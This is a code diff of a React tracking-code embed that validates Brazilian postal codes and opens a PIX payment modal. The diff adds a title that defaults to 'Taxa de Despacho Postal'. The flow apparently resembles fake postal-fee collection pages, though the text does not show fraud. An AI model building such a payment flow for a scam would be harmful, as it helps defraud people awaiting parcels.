@@ -24,8 +24,8 @@ const Embed = () => {
   const [pixCopiaECola, setPixCopiaECola] = useState('');
   const [pixTransactionId, setPixTransactionId] = useState('');
   const [pixAmount, setPixAmount] = useState(0);
+  const [pixTitle, setPixTitle] = useState('');
 
-  // Auto-busca se o código for passado na URL (ex: ?codigo=BR123456789BR)
   useEffect(() => {
     const codeFromUrl = searchParams.get('codigo') || searchParams.get('code');
     if (codeFromUrl && codeFromUrl.length >= 12) {
@@ -38,11 +38,8 @@ const Embed = () => {
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     let value = e.target.value.toUpperCase();
     if (value.length > 12) return;
-    
-    // Validação básica: deve começar com BR
     if (value.length >= 1 && value[0] !== 'B') return;
     if (value.length >= 2 && value[1] !== 'R') return;
-
     setTrackingCode(value);
   };
 
@@ -140,6 +137,7 @@ const Embed = () => {
       setPixTransactionId(data.idTransaction);
       setPixCopiaECola(data.pixCopiaECola);
       setPixAmount(data.amount);
+      setPixTitle(data.taxName || "Taxa de Despacho Postal");
       setIsPixModalOpen(true);
     } catch (err) {
       console.error(err);
@@ -162,6 +160,7 @@ const Embed = () => {
         pixCopiaECola={pixCopiaECola}
         transactionId={pixTransactionId}
         amount={pixAmount}
+        title={pixTitle}
         onSuccess={handlePaymentSuccess}
       />
 
